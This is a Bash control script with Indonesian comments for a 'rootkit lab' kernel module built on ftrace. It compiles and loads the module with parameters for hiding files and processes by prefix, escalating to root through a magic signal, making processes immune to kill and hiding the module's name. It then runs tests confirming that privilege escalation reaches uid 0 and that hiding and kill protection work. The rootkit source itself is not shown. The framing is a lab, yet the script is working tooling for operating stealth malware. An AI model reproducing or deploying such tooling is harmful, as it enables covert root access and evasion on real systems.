#!/usr/bin/env bash
# rk.sh — kontrol interaktif rootkit lab (ftrace, kernel 6.8+).
#
#   ./rk.sh              menu interaktif (atau: ./rk.sh --menu)
#   ./rk.sh build        compile modul (tak butuh root)
#   ./rk.sh load         insmod (tanya param dulu bila interaktif)
#   ./rk.sh status       lsmod + sysfs + dmesg ringkas
#   ./rk.sh test         uji hide-file + privesc + anti-kill (non-destruktif)
#   ./rk.sh unhide       kirim sinyal unhide (nama modul terlihat lagi)
#   ./rk.sh unload       rmmod + bersih test file
#
# Uji di VPS, JANGAN di lokal. Butuh root untuk load/unload (via sudo).
#
# Catatan: module->list TIDAK diubah (lihat rootkit.c), jadi modul selalu
# terlihat di lsmod dan `rmmod` selalu bekerja. hide_module hanya menyembunyikan
# NAMA modul dari listing direktori (/sys/module).
set -u
cd "$(dirname "$0")"

KO="rootkit.ko"
DEF_PREFIX="rk_"
DEF_MAGIC=64
DEF_UNHIDE=63
DEF_HIDEMOD=1

SUDO=""
[ "$(id -u)" = "0" ] || { command -v sudo >/dev/null && SUDO="sudo"; }

need_root() {
  if [ "$(id -u)" != "0" ] && [ -z "$SUDO" ]; then
    echo "butuh root/sudo untuk '$1'"; return 1
  fi
}

loaded() { lsmod | grep -q "^rootkit "; }

do_build() {
  echo "[rk] kernel: $(uname -r)"
  make || { echo "[rk] BUILD GAGAL"; return 1; }
  echo "[rk] build OK: $KO"
}

# Param bisa dioverride via env: PREFIX= MAGIC= UNHIDE= HIDEMOD=
do_load() {
  need_root load || return 1
  if loaded; then echo "[rk] modul sudah loaded"; return 0; fi
  [ -f "$KO" ] || { echo "[rk] $KO tidak ada — ./rk.sh build dulu"; return 1; }
  local prefix="${PREFIX:-$DEF_PREFIX}" magic="${MAGIC:-$DEF_MAGIC}"
  local unhide="${UNHIDE:-$DEF_UNHIDE}" hidemod="${HIDEMOD:-$DEF_HIDEMOD}"
  if [ -t 0 ]; then
    read -rp "hide prefix [$prefix]: " v; [ -n "${v:-}" ] && prefix="$v"
    read -rp "magic signal 1-64 [$magic]: " v; [ -n "${v:-}" ] && magic="$v"
    read -rp "unhide signal 1-64 [$unhide]: " v; [ -n "${v:-}" ] && unhide="$v"
    read -rp "hide module 0/1 [$hidemod]: " v; [ -n "${v:-}" ] && hidemod="$v"
  fi
  if [ "$magic" = "$unhide" ]; then
    echo "[rk] magic dan unhide tidak boleh sama (modul tidak akan bisa di-unhide)"
    return 1
  fi
  $SUDO insmod "$KO" hide_prefix="$prefix" proc_prefix="$prefix" \
    sig_magic="$magic" sig_unhide="$unhide" hide_module="$hidemod" || return 1
  # simpan param efektif untuk test/unhide berikutnya (4 baris)
  printf '%s\n%s\n%s\n%s\n' "$prefix" "$magic" "$unhide" "$hidemod" > .rk_params
  echo "[rk] loaded (prefix=$prefix magic=$magic unhide=$unhide hidemod=$hidemod)"
}

saved_param() { # $1 = nomor baris 1..4
  [ -f .rk_params ] && sed -n "${1}p" .rk_params || case "$1" in
    1) echo "$DEF_PREFIX";; 2) echo "$DEF_MAGIC";; 3) echo "$DEF_UNHIDE";; *) echo "$DEF_HIDEMOD";; esac
}

do_status() {
  echo "--- lsmod:"; (lsmod | grep -E "^rootkit |^Module" || echo "(rootkit tidak terlihat — belum load?)")
  echo "--- /sys/module:"; (ls /sys/module | grep -x rootkit || echo "(tidak terlihat)")
  echo "--- dmesg [rk]:"; ($SUDO dmesg 2>/dev/null | grep '\[rk\]' | tail -n 6 || echo "(dmesg tak bisa dibaca)")
}

do_test() {
  local prefix magic fail=0
  prefix="$(saved_param 1)"; magic="$(saved_param 2)"
  echo "[1] hide-file (prefix=$prefix, hide_module=$(saved_param 4))"
  touch "/tmp/${prefix}tikus" /tmp/rkcheck_normal
  if ls /tmp | grep -q "$prefix"; then echo "  GAGAL: $prefix masih terlihat"; fail=1; else echo "  OK: $prefix tersembunyi"; fi
  if ls /tmp | grep -q rkcheck_normal; then echo "  OK: file normal terlihat"; else echo "  GAGAL: file normal ikut hilang!"; fail=1; fi

  echo "[2] privesc (signal $magic)"
  if [ "$(bash -c "kill -$magic \$\$; id -u" 2>/dev/null)" = "0" ]; then
    echo "  OK: id -u = 0 (root)"
  else echo "  GAGAL: privesc tidak jalan (modul loaded? sinyal benar?)"; fail=1; fi

  echo "[3] anti-kill (prefix=$prefix)"
  cp /bin/sleep "/tmp/${prefix}sleep" 2>/dev/null
  "/tmp/${prefix}sleep" 10 </dev/null >/dev/null 2>&1 &
  local p=$!
  sleep 0.5
  if ! kill -0 "$p" 2>/dev/null; then
    echo "  GAGAL: proses uji sudah mati sebelum diuji (ESRCH)"; fail=1
  else
    local msg rc
    msg="$(kill -9 "$p" 2>&1)"; rc=$?
    if [ "$rc" -eq 0 ]; then
      echo "  GAGAL: proses proteksi bisa di-kill"; fail=1
    elif printf '%s' "$msg" | grep -qi "not permitted"; then
      echo "  OK: kill -9 ditolak EPERM"
    elif printf '%s' "$msg" | grep -qi "no such process"; then
      echo "  GAGAL: proses sudah mati (ESRCH), bukan dilindungi"; fail=1
    else
      echo "  GAGAL: kill gagal dengan alasan tak dikenal: $msg"; fail=1
    fi
    # membersihkan proses: SIGINT tidak diproteksi oleh modul
    kill -INT "$p" 2>/dev/null
    for _ in 1 2 3 4 5; do kill -0 "$p" 2>/dev/null || break; sleep 0.2; done
    kill -9 "$p" 2>/dev/null
    wait "$p" 2>/dev/null
  fi
  rm -f "/tmp/${prefix}tikus" /tmp/rkcheck_normal "/tmp/${prefix}sleep"
  return "$fail"
}

do_unhide() {
  need_root unhide || return 1
  local unhide; unhide="$(saved_param 3)"
  if ! loaded; then echo "[rk] modul tidak loaded"; return 1; fi
  kill "-$unhide" 1 2>/dev/null && echo "[rk] sinyal unhide ($unhide) terkirim" || { echo "[rk] sinyal gagal"; return 1; }
  sleep 1
}

do_unload() {
  need_root unload || return 1
  if ! loaded; then
    echo "[rk] modul tidak loaded — tidak ada yang di-unload"
    return 0
  fi
  loaded && do_unhide || true
  if $SUDO rmmod rootkit; then
    echo "[rk] unloaded OK"
    rm -f .rk_params
    return 0
  fi
  echo "[rk] rmmod GAGAL — modul masih loaded"; return 1
}

menu() {
  while true; do
    echo; echo "=== rk.sh : rootkit lab ($(loaded && echo LOADED || echo UNLOADED)) ==="
    echo " 1) build    2) load     3) status   4) test"
    echo " 5) unhide   6) unload   0) keluar"
    read -rp "pilih [0-6]: " c
    case "$c" in
      1) do_build;; 2) do_load;; 3) do_status;; 4) do_test;;
      5) do_unhide;; 6) do_unload;; 0) break;; *) echo "pilihan?";;
    esac
  done
}

case "${1:-}" in
  "") [ -t 0 ] && menu || { echo "stdin bukan TTY — pakai: $0 {build|load|status|test|unhide|unload}"; exit 1; };;
  --menu) menu;;
  build) do_build;; load) do_load;; status) do_status;;
  test) do_test;; unhide) do_unhide;; unload) do_unload;;
  *) echo "pakai: $0 [--menu|build|load|status|test|unhide|unload]"; exit 1;;
esac
